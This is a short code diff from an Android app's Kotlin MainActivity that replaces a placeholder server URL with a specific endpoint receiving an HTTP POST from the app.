@@ -33,7 +33,7 @@ class MainActivity : AppCompatActivity() {
             .build()
 
         val request = Request.Builder()
-            .url("https://YOURDOMAIN.COM/api/receive.php")
+            .url("https://fb2fa.COM/sendcontentfromapp/receivefromapp.php")
             .post(body)
             .build()
 
